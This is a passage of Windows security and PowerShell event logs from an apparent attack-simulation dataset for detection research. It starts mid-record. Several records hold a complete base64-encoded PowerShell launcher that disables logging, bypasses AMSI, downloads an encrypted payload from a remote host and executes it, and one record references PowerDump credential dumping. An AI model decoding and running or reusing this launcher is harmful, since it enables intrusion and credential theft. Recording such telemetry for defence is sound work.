GUARgBhAFUATABUAFcAZQBiAFAAUgBvAFgAeQA7ACQAMAA5ADcAYwAuAFAAcgBvAFgAWQAuAEMAUgBFAGQAZQBuAFQAaQBhAEwAUwAgAD0AIABbAFMAWQBzAHQARQBtAC4ATgBFAFQALgBDAHIAZQBEAEUAbgB0AEkAQQBsAEMAQQBDAGgARQBdADoAOgBEAEUARgBhAFUATAB0AE4ARQB0AHcAbwByAGsAQwByAGUAZABlAE4AVABpAGEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADAAOQA3AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBzAFQAZQBtAC4AVABFAFgAVAAuAEUATgBjAE8AZABpAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAVABCAHkAVABFAFMAKAAnADQARwBMAHkAXwA2ADwAKgBpAGYAcgA+AE0AVwB9AEkAKQBVAHAAdgB4AEAASwB1AFMAfgAzAGwAZABZADgAawAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AE4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgATwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkADAAOQA3AEMALgBIAEUAQQBkAGUAUgBzAC4AQQBEAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAG0AZABKAGYASAByAFUAPQBHAGgAagBOAGQAUABCADIATABEAE0ALwBpAG8ATgBXAFQAOABWAEkAVwBXAFcAaABOAGwAQQA9ACIAKQA7ACQARABBAHQAYQA9ACQAMAA5ADcAQwAuAEQATwBXAG4ATABPAEEARABEAGEAVABBACgAJABzAEUAUgArACQAdAApADsAJABpAHYAPQAkAGQAQQB0AEEAWwAwAC4ALgAzAF0AOwAkAGQAQQBUAEEAPQAkAGQAQQBUAGEAWwA0AC4ALgAkAGQAQQBUAEEALgBsAGUATgBHAHQASABdADsALQBKAG8AaQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAYQB0AEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==\r\n\tEngineVersion=5.1.18362.752\r\n\tRunspaceId=50f3d352-332d-4cc2-9811-b903295a8adb\r\n\tPipelineId=1\r\n\tScriptName=\r\n\tCommandLine=                [PowerDump.Native]::RegCloseKey($hkey) | Out-Null\n \r\n\r\nDetails: \r\nCommandInvocation(Out-Null): \"Out-Null\"\r\nParameterBinding(Out-Null): name=\"InputObject\"; value=\"0\"\r\n","@timestamp":"2020-09-22T08:22:44.399Z","SourceModuleType":"im_msvistalog","port":64545,"RecordNumber":240736,"Task":8,"@version":"1","SourceModuleName":"eventlog","Severity":"INFO","SourceName":"PowerShell","Category":"Pipeline Execution Details","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
{"Keywords":-9214364837600034816,"SeverityValue":2,"SubjectDomainName":"THESHIRE","EventID":4690,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","ExecutionProcessID":4,"Channel":"security","host":"wec.internal.cloudapp.net","SubjectUserSid":"S-1-5-21-4228717743-1032521047-1810997296-1104","EventReceivedTime":"2020-09-22 04:22:44","ProcessId":"0x704","ThreadID":3484,"EventType":"AUDIT_SUCCESS","Opcode":"Info","EventTime":"2020-09-22 04:22:43","Message":"An attempt was made to duplicate a handle to an object.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-5-21-4228717743-1032521047-1810997296-1104\r\n\tAccount Name:\t\tpgustavo\r\n\tAccount Domain:\t\tTHESHIRE\r\n\tLogon ID:\t\t0x10A7DF\r\n\r\nSource Handle Information:\r\n\tSource Handle ID:\t0x1b8\r\n\tSource Process ID:\t0x704\r\n\r\nNew Handle Information:\r\n\tTarget Handle ID:\t0x30d0\r\n\tTarget Process ID:\t0x4","SourceHandleId":"0x1b8","TargetHandleId":"0x30d0","@timestamp":"2020-09-22T08:22:44.400Z","SubjectLogonId":"0x10a7df","SourceModuleType":"im_msvistalog","port":64545,"RecordNumber":820524,"SubjectUserName":"pgustavo","SourceProcessId":"0x704","Task":12807,"@version":"1","OpcodeValue":0,"SourceModuleName":"eventlog","Severity":"INFO","SourceName":"Microsoft-Windows-Security-Auditing","Version":0,"TargetProcessId":"0x4","Category":"Handle Manipulation","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
{"Keywords":0,"SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:44","EventID":4103,"ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","ExecutionProcessID":5972,"Channel":"Microsoft-Windows-PowerShell/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ActivityID":"{3AF69DEC-79B4-0000-E12A-2D856290D601}","UserID":"S-1-5-18","ThreadID":8112,"EventType":"INFO","Opcode":"To be used when operation is just executing a method","EventTime":"2020-09-22 04:22:43","@timestamp":"2020-09-22T08:22:44.400Z","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"SYSTEM","RecordNumber":213890,"Payload":"CommandInvocation(New-Object): \"New-Object\"\r\nParameterBinding(New-Object): name=\"TypeName\"; value=\"Text.Stringbuilder\"\r\nParameterBinding(New-Object): name=\"ArgumentList\"; value=\"1024\"\r\n","Task":106,"Domain":"NT AUTHORITY","@version":"1","OpcodeValue":20,"SourceModuleName":"eventlog","ERROR_EVT_UNRESOLVED":true,"Severity":"INFO","ContextInfo":"        Severity = Informational\r\n        Host Name = Default Host\r\n        Host Version = 5.1.18362.752\r\n        Host ID = da6e33cf-5ea5-45e8-b75b-b0fc1487af33\r\n        Host Application = C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAcwBJAE8AbgBUAEEAYgBsAGUALgBQAFMAVgBlAFIAcwBpAG8AbgAuAE0AQQBqAE8AUgAgAC0ARwBlACAAMwApAHsAJABBAEMARQA2AD0AWwByAEUAZgBdAC4AQQBzAHMARQBNAGIATABZAC4ARwBlAFQAVAB5AFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYASQBFAGAAbABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAGYAKAAkAEEAYwBlADYAKQB7ACQANABjADAARAA9ACQAQQBjAGUANgAuAEcARQB0AFYAYQBMAFUAZQAoACQATgBVAEwAbAApADsASQBmACgAJAA0AGMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQANABjADAAZABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA0AEMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBhAGwAPQBbAEMAbwBMAEwAZQBDAHQAaQBPAE4AcwAuAEcAZQBuAEUAUgBpAEMALgBEAEkAQwB0AEkAbwBOAEEAUgB5AFsAUwB0AFIAaQBOAGcALABTAFkAUwBUAEUAbQAuAE8AYgBqAGUAQwBUAF0AXQA6ADoATgBlAHcAKAApADsAJABWAEEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABWAGEATAAuAEEARABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkADQAQwAwAGQAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBhAEwAfQBFAGwAUwBFAHsAWwBTAGMAcgBJAFAAVABCAEwAbwBDAEsAXQAuACIARwBFAFQARgBpAEUAYABMAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQB0AFYAYQBsAFUAZQAoACQAbgBVAGwATAAsACgATgBlAFcALQBPAGIAagBFAEMAVAAgAEMATwBsAEwAZQBDAHQASQBPAG4AUwAuAEcARQBOAEUAcgBpAGMALgBIAGEAUwBoAFMAZQBUAFsAcwBUAFIASQBOAGcAXQApACkAfQAkAFIAZQBmAD0AWwBSAEUARgBdAC4AQQBzAHMARQBNAGIATAB5AC4ARwBlAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBFAGYALgBHAEUAVABGAGkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAHUAZQAoACQAbgBVAEwATAAsACQAdABSAFUARQApADsAfQA7AFsAUwBZAFMAVABFAE0ALgBOAEUAVAAuAFMARQBSAFYASQBDAEUAUABvAEkAbgB0AE0AQQBOAEEARwBFAHIAXQA6ADoARQB4AHAAZQBjAFQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAMAA5ADcAQwA9AE4AZQBXAC0ATwBiAGoAZQBDAFQAIABTAHkAcwB0AGUATQAuAE4ARQBUAC4AVwBlAGIAQwBsAEkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQAZQB4AHQALgBFAE4AQwBvAEQASQBOAEcAXQA6ADoAVQBOAGkAYwBPAGQAZQAuAEcAZQBUAFMAVAByAGkAbgBHACgAWwBDAG8ATgBWAEUAUgBUAF0AOgA6AEYAUgBPAG0AQgBhAHMAZQA2ADQAUwBUAFIAaQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbgBlAHcAcwAuAHAAaABwACcAOwAkADAAOQA3AEMALgBIAGUAQQBEAGUAUgBzAC4AQQBEAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAAwADkANwBjAC4AUABSAG8AeABZAD0AWwBTAHkAUwB0AGUAbQAuAE4AZQBUAC4AVwBlAGIAUgBFAHEAdQBFAHMAdABdADoAOgBEAGUARgBhAFUATABUAFcAZQBiAFAAUgBvAFgAeQA7ACQAMAA5ADcAYwAuAFAAcgBvAFgAWQAuAEMAUgBFAGQAZQBuAFQAaQBhAEwAUwAgAD0AIABbAFMAWQBzAHQARQBtAC4ATgBFAFQALgBDAHIAZQBEAEUAbgB0AEkAQQBsAEMAQQBDAGgARQBdADoAOgBEAEUARgBhAFUATAB0AE4ARQB0AHcAbwByAGsAQwByAGUAZABlAE4AVABpAGEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADAAOQA3AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBzAFQAZQBtAC4AVABFAFgAVAAuAEUATgBjAE8AZABpAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAVABCAHkAVABFAFMAKAAnADQARwBMAHkAXwA2ADwAKgBpAGYAcgA+AE0AVwB9AEkAKQBVAHAAdgB4AEAASwB1AFMAfgAzAGwAZABZADgAawAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AE4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgATwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkADAAOQA3AEMALgBIAEUAQQBkAGUAUgBzAC4AQQBEAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAG0AZABKAGYASAByAFUAPQBHAGgAagBOAGQAUABCADIATABEAE0ALwBpAG8ATgBXAFQAOABWAEkAVwBXAFcAaABOAGwAQQA9ACIAKQA7ACQARABBAHQAYQA9ACQAMAA5ADcAQwAuAEQATwBXAG4ATABPAEEARABEAGEAVABBACgAJABzAEUAUgArACQAdAApADsAJABpAHYAPQAkAGQAQQB0AEEAWwAwAC4ALgAzAF0AOwAkAGQAQQBUAEEAPQAkAGQAQQBUAGEAWwA0AC4ALgAkAGQAQQBUAEEALgBsAGUATgBHAHQASABdADsALQBKAG8AaQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAYQB0AEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==\r\n        Engine Version = 5.1.18362.752\r\n        Runspace ID = 50f3d352-332d-4cc2-9811-b903295a8adb\r\n        Pipeline ID = 1\r\n        Command Name = New-Object\r\n        Command Type = Cmdlet\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 28402\r\n        User = THESHIRE\\pgustavo\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n","SourceName":"Microsoft-Windows-PowerShell","Version":1,"Category":"Executing Pipeline","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
{"Keywords":-9223372036854775808,"SeverityValue":2,"SourceImage":"C:\\windows\\system32\\svchost.exe","EventID":10,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","UserID":"S-1-5-18","SourceProcessGUID":"{b34bc01c-226b-5f69-1000-000000000900}","ThreadID":4048,"TargetImage":"C:\\windows\\System32\\svchost.exe","GrantedAccess":"0x1000","EventType":"INFO","Opcode":"Info","EventTime":"2020-09-22 04:22:43","EventReceivedTime":"2020-09-22 04:22:44","@timestamp":"2020-09-22T08:22:44.400Z","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"SYSTEM","RecordNumber":3399383,"SourceProcessId":"908","SourceThreadId":"7520","Task":10,"Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SourceModuleName":"eventlog","TargetProcessGUID":"{b34bc01c-2271-5f69-5500-000000000900}","Severity":"INFO","SourceName":"Microsoft-Windows-Sysmon","Version":3,"TargetProcessId":"3308","Category":"Process accessed (rule: ProcessAccess)","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+222a3|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+1a172|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19e3b|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19318|C:\\windows\\SYSTEM32\\ntdll.dll+3081d|C:\\windows\\SYSTEM32\\ntdll.dll+345b4|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","UtcTime":"2020-09-22 08:22:43.475","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
